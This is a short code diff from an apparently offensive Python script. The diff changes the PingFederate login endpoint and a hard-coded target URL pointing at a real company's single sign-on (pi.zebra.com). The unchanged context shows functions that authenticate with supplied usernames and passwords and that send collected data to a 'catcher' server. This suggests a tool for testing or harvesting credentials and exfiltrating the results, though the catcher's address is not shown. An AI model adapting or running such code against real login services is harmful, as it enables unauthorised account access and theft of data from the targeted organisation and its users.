@@ -68,7 +68,7 @@ def pingfed_authenticate(url, username, password):
     }
 
     try:
-        full_url = f"{url}/idp/prp.wsf"
+        full_url = f"{url}/idp/XUwHg/resume/idp/prp.ping"
 
         # Get cookie and form action URL. Update with each request to avoid "page expired" responses.
         sess = requests.session()
@@ -115,7 +115,7 @@ def send_data_to_catcher(data, use_ssl):
         print(f"[-] Failed to send data to the catcher.")
 
 # Perform PingFederate authentication
-pingfed_url = "https://pi.zebra.com/"  # Replace with your PingFederate URL
+pingfed_url = "https://pi.zebra.com/idp/XUwHg/resume/idp/prp.ping"  # Replace with your PingFederate URL
 auth_response = pingfed_authenticate(pingfed_url, username, password)
 
 data = {
